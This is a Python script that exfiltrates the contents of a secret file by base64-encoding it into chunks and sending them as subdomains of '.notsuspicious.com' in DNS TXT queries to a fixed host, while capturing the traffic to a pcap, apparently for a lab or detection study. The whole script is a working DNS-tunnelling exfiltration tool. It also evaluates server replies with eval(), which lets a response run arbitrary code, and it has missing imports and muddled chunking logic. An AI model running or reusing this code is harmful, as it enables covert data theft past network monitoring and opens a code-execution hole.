from time import sleep
import base64
import dns.message
import dns.query
import dns.rdata
import dns.rdataclass
import dns.rdatatype
import dns.rrset
from scapy.all import *
from scapy.sendrecv import sniff
from scapy.utils import wrpcap

# Read the secret file
def read_file(filename):
    secret_file = open(filename,"r")
    return str(secret_file.read())

# Compose the base64 encoded text
def dns_compose(text):
    return base64.b64encode(text.encode('utf-8')).decode('utf-8')

# Hash the input string using SHA-256
def hash_string(input_string):
    sha256_hash = hashlib.sha256()
    sha256_hash.update(input_string.encode('utf-8'))
    return sha256_hash.hexdigest()

# Print the records of the specified type
def print_records(response, record_type):
    records = []
    # Iterate over the answers in the response message and extract the records
    for answer in response.answer:
        if answer.rdtype == record_type:
            for item in answer.items:
                if record_type == dns.rdatatype.TXT:
                    records.append(b''.join(item.strings).decode())
    if records:
        for record in records:
            return record
    else:
        print(f"No {dns.rdatatype.to_text(record_type)} records found.")
    return False

# Start the sniffing and writing thread for the pcap file
def pcap_writer():
    def sniff_and_write():
        packets = sniff(iface="eth0", filter="udp and port 53", timeout=8)
        wrpcap("send_data.pcap", packets)
        with open("packet_details.txt", "w") as file:
            for packet in packets:
                file.write(packet.show(dump=True) + "\n")
    thread = threading.Thread(target=sniff_and_write)
    thread.start()

# Send a minimal DNS request to the specified server
def send_minimal_dns_request(server_ip, domain :str, port):
    if not domain.endswith('.'):
        domain += '.'

    # Create a DNS request message
    request = dns.message.make_query(domain, dns.rdatatype.TXT)

    additional_data = dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.TXT, hash_string(domain))

    # Resource Record Set (RRSet) für Additional Section
    rrset = dns.rrset.from_rdata(dns.name.from_text(domain), 300, additional_data)
    request.additional.append(rrset)

    request_bytes = request.to_wire()
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(request_bytes, (server_ip, port))
        try:
            response_bytes, addr = sock.recvfrom(512)
            response = dns.message.from_wire(response_bytes)
            a =  eval(print_records(response, dns.rdatatype.TXT))
            return a
        except socket.timeout:
            print("No response received (Timeout)")

if __name__ == "__main__":
    receiver_ip = "172.36.0.3"
    port = 53
    domain_base = ".notsuspicious.com"
    print(f"Minimal DNS request sent to {receiver_ip}:{port}")
    secret_text = read_file("secret_file.txt")
    size = 30
    number_of_packages = ((size-1)+len(secret_text))//size
    pcap_writer()
    sleep(3)
    # Send the DNS requests
    for i in range(0,number_of_packages):
        resp = True
        while resp:
            # Compose the domain name for the request based on the current package
            if len(secret_text)>=size*(i):
                current_domain = dns_compose(secret_text[i*size:(i+1)*size])
            elif len(secret_text)>=size*(i+1):
                current_domain = dns_compose(secret_text[i*size:-1])
            else:
                print("ERROR:Index went past Domain Name length")
                break
            current_domain += "."+ str(number_of_packages - i -1)+domain_base
            print(current_domain)
            print(f"Sending DNS request {i}")
            resp = send_minimal_dns_request(receiver_ip, str(current_domain), port)
